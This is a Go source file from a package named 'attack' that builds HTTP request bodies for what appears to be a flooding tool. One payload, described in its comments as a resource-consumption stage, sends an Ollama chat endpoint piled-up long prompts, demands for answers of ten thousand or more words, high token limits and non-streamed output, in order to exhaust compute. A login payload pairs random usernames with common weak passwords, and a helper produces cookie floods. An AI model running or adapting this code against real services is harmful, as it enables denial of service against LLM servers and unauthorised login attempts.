// http_payload.go
package attack

import (
	"fmt"
	"math/rand"
	"time"
	"strings"
	"encoding/json"
)

var PostJSON = map[string]string{
	"DEEPSEEK_2": GetPayload("DEEPSEEK_2"), // 第二阶段，构造Prompt进行资源消耗
	"LOGIN":      GetPayload("LOGIN"),      // 标准登录请求
}

var complexPrompts = []string{
    `请设计一个基于深度学习的多模态系统，能够同时处理文本、图像、音频和视频数据。详细说明每种模态的特征提取方法、多模态融合策略、注意力机制的实现以及端到端训练流程。该系统需要支持跨模态检索、多模态问答、内容生成，并能在边缘设备上部署。分析系统在各种场景下的计算复杂度、内存需求和能耗特性。针对每个模块提供伪代码实现，并讨论如何解决模态不平衡、对齐困难等挑战。最后，提出一种新颖的算法来提高系统的泛化能力和鲁棒性。`,
    
    `请详细分析和设计一个分布式区块链系统，要求支持每秒10万次交易处理能力，确保拜占庭容错，并实现跨链互操作性。该系统应具备智能合约执行环境、零知识证明隐私保护机制、以及高效的共识算法。详细讨论分片技术实现、状态同步机制、P2P网络优化以及密码经济学激励设计。评估不同攻击向量的防御策略，分析存储扩展性问题，并提供完整的系统架构图和核心组件的伪代码。最后，讨论该系统在金融、供应链和物联网等领域的具体应用场景及其面临的技术和监管挑战。`,
    
    `请设计一个通用的强化学习框架，能够同时支持离散和连续动作空间、单智能体和多智能体训练、以及模仿学习和自监督学习范式。详细分析价值函数近似、策略梯度、模型预测控制等方法的理论基础和实现细节。讨论探索与利用的平衡策略、样本效率优化技术、以及分布式训练架构。针对奖励稀疏、非平稳环境、部分可观测性等挑战，提出创新性解决方案。设计一套完整的评估基准和可视化工具，用于分析智能体行为和学习过程。最后，提供该框架在机器人控制、自动驾驶、金融交易和医疗决策等领域的应用示例和性能评估。`,
    
    `请设计一个大规模图神经网络系统，能够处理包含数十亿节点和数千亿边的异构图数据。详细讨论图表示学习、邻居采样策略、消息传递机制、以及图池化操作的理论依据和算法实现。分析如何解决过平滑、长距离依赖和动态图结构等关键挑战。提出一种创新的分布式训练架构，包括图分区策略、通信优化和内存管理机制。评估不同硬件平台(CPU、GPU、TPU)上的性能特性，并提供相应的优化技术。设计一套完整的图数据预处理、增强和规范化流程。最后，展示该系统在社交网络分析、蛋白质结构预测、推荐系统和知识图谱推理等应用场景的具体实现和性能评估。`,
    
    `请详细分析和设计一个端到端的联邦学习系统，满足以下要求：支持异构设备(从智能手机到数据中心)、保证差分隐私、抵抗不同类型的攻击(包括模型逆向和成员推断)、并确保模型收敛性。详细说明客户端选择策略、本地训练过程、模型聚合机制、以及通信压缩技术。分析不同联邦优化算法的理论性质和实际表现。设计一套完整的系统监控和调试工具，用于诊断训练失败和性能下降。评估系统在不同数据分布场景下(IID和非IID)的表现，并提供改进策略。最后，讨论该系统在医疗健康、智能家居、金融科技和边缘计算等领域的具体应用案例和部署考虑。`,
}


// 这里传回json格式，用于构造POST请求，确保请求可以直接发送。
func GetPayload(method string) string {
	switch method {
	case "LOGIN":
		return generateLoginPayload()
	case "POST":
		// 默认POST请求体
		return generateDefaultPostPayload()
	case "DEEPSEEK_2":
		return generateAIPayload()
	default:
		// 如果没有匹配的方法，返回一个默认的JSON
		return `{"action":"request","timestamp":` + fmt.Sprintf("%d", time.Now().Unix()) + `}`
	}
}

// 生成默认的POST请求体
func generateDefaultPostPayload() string {
	payload := fmt.Sprintf(`{
		"action": "request",
		"id": "%s",
		"data": {
			"timestamp": %d,
			"parameters": {
				"param1": "%s",
				"param2": %d,
				"param3": %t
			}
		}
	}`,
		randomString(8),
		time.Now().Unix(),
		randomString(10),
		rand.Intn(1000),
		rand.Intn(2) == 1,
	)
	
	return compressJSON(payload)
}

func generateAIPayload() string {
    // 构造符合Ollama API的请求格式
    // Ollama的/api/chat端点接受的格式是：
    // {"model": "模型名", "messages": [{"role": "user", "content": "提示内容"}]}
    
    // 随机选择一个复杂提示或者组合多个
    var prompt string
    
    // 25%概率组合多个prompt以创建超长输入
    if rand.Intn(4) == 0 {
        // 组合2-3个提示
        numPrompts := 2 + rand.Intn(2)
        var selectedPrompts []string
        for i := 0; i < numPrompts; i++ {
            selectedPrompts = append(selectedPrompts, complexPrompts[rand.Intn(len(complexPrompts))])
        }
        prompt = strings.Join(selectedPrompts, "\n\n另外，")
    } else {
        // 使用单个提示
        promptIndex := rand.Intn(len(complexPrompts))
        prompt = complexPrompts[promptIndex]
    }
    
    // 添加额外的资源消耗指令
    extraInstructions := []string{
        "请用至少10000字回答",
        "分析至少20个不同角度",
        "提供详尽的代码示例",
        "使用复杂的数学公式进行分析",
        "为每个部分创建详细的流程图和伪代码",
        "进行深入的性能分析和资源评估",
    }
    
    // 50%概率添加额外指令
    if rand.Intn(2) == 0 {
        extraIndex := rand.Intn(len(extraInstructions))
        prompt += "\n\n" + extraInstructions[extraIndex]
    }
    
    // 添加随机的系统角色指令，引导模型执行更复杂的处理
    systemRoles := []string{
        "你现在是一名资深系统架构师，必须提供极其详尽的分析",
        "你是一名AI研究员，需要详细解释所有概念并提供数学证明",
        "你是一名全栈开发工程师，需要提供完整的代码实现",
        "你是一名数据科学家，需要详细分析每个数据处理步骤",
    }
    
    // 构建Ollama API请求体
    messages := []map[string]string{
        {"role": "user", "content": prompt},
    }
    
    // 33%概率添加系统角色消息
    if rand.Intn(3) == 0 {
        systemRole := systemRoles[rand.Intn(len(systemRoles))]
        // 将系统角色插入到messages数组的开头
        messages = append([]map[string]string{{"role": "system", "content": systemRole}}, messages...)
    }
    
    // 添加温度和最大token参数以增加资源消耗
    temperature := 0.7 + rand.Float64()*0.3 // 0.7-1.0之间的随机值
    maxTokens := 8192 + rand.Intn(8192)    // 8192-16384之间的随机值
    
    // 构造完整的API请求
    requestMap := map[string]interface{}{
        "model": "deepseek-r1:1.5b",
        "messages": messages,
        "temperature": temperature,
        "max_tokens": maxTokens,
        "stream": false, // 不使用流式响应，强制模型一次生成所有内容
    }
    
    // 将map转换为JSON字符串
    jsonBytes, err := json.Marshal(requestMap)
    if err != nil {
        // 如果序列化失败，返回一个基本的请求
        return `{"model":"deepseek-r1:1.5b","messages":[{"role":"user","content":"设计一个能处理每秒百万请求的分布式系统"}]}`
    }
    
    return string(jsonBytes)
}


// 生成通用登录请求负载
func generateLoginPayload() string {
	// 随机选择用户名格式
	usernames := []string{
		"user_%d", 
		"admin_%d", 
		"test_%d",
		"customer_%d",
		"support_%d",
		"demo_%d",
	}
	
	// 随机选择密码
	passwords := []string{
		"password123",
		"admin123",
		"123456",
		"qwerty",
		"letmein",
		"welcome1",
		"abc123",
		"monkey",
		"1234567890",
	}
	
	// 生成随机的用户名和密码组合
	username := fmt.Sprintf(usernames[rand.Intn(len(usernames))], rand.Intn(10000))
	password := passwords[rand.Intn(len(passwords))]
	
	// 构建完整的登录请求体JSON
	payload := fmt.Sprintf(`{
		"username": "%s",
		"password": "%s",
		"remember": %t,
		"client": {
			"device": "%s",
			"os": "%s",
			"browser": "%s",
			"ip": "%d.%d.%d.%d",
			"timestamp": %d
		}
	}`,
		username,
		password,
		rand.Intn(2) == 1, // 随机boolean值
		getRandomDevice(),
		getRandomOS(),
		getRandomBrowser(),
		rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256), // 随机IP
		time.Now().Unix(),
	)
	
	// 返回压缩的JSON（移除空白字符）
	return compressJSON(payload)
}

// 获取随机设备类型
func getRandomDevice() string {
	devices := []string{
		"Desktop", "Laptop", "Tablet", "Mobile", "Unknown",
	}
	return devices[rand.Intn(len(devices))]
}

// 获取随机操作系统
func getRandomOS() string {
	oses := []string{
		"Windows 10", "Windows 11", "macOS", "Linux", "iOS", "Android",
	}
	return oses[rand.Intn(len(oses))]
}

// 获取随机浏览器
func getRandomBrowser() string {
	browsers := []string{
		"Chrome", "Firefox", "Safari", "Edge", "Opera",
	}
	return browsers[rand.Intn(len(browsers))]
}

// 生成大量随机Cookie字符串
func generateCookieString() string {
	// 生成的Cookie数量 (10-30个之间)
	cookieCount := 10 + rand.Intn(21)
	
	var cookies []string
	
	// Cookie名称前缀
	cookiePrefixes := []string{
		"session", "user", "auth", "token", "id", "track", 
		"pref", "lang", "theme", "visit", "utm", "device",
		"cart", "promo", "ref", "src", "campaign", "medium",
		"browser", "platform", "resolution", "timezone", "country",
	}
	
	// 生成随机Cookie
	for i := 0; i < cookieCount; i++ {
		var prefix string
		if i < len(cookiePrefixes) {
			prefix = cookiePrefixes[i]
		} else {
			prefix = cookiePrefixes[rand.Intn(len(cookiePrefixes))]
		}
		
		name := prefix + "_" + randomString(8)
		value := randomString(20 + rand.Intn(100)) // 值长度为20-120之间
		
		cookie := name + "=" + value
		
		// 40%概率添加Cookie属性
		if rand.Intn(10) < 4 {
			attributes := []string{
				"; path=/",
				"; domain=." + randomString(8) + ".com",
				"; expires=" + time.Now().Add(24*time.Hour).Format(time.RFC1123),
				"; max-age=86400",
				"; secure",
				"; httponly",
				"; samesite=lax",
			}
			
			// 添加1-3个随机属性
			attrCount := 1 + rand.Intn(3)
			for j := 0; j < attrCount; j++ {
				if j < len(attributes) {
					cookie += attributes[j]
				}
			}
		}
		
		cookies = append(cookies, cookie)
	}
	
	// 连接所有Cookie
	return strings.Join(cookies, "; ")
}

// 压缩JSON（移除空白字符）
func compressJSON(json string) string {
	// 这是一个非常简单的实现，仅移除换行符和制表符
	// 实际生产环境可能需要更复杂的JSON解析和压缩逻辑
	result := strings.Replace(json, "\n", "", -1)
	result = strings.Replace(result, "\t", "", -1)
	// 移除多余的空格
	for strings.Contains(result, "  ") {
		result = strings.Replace(result, "  ", " ", -1)
	}
	return result
}

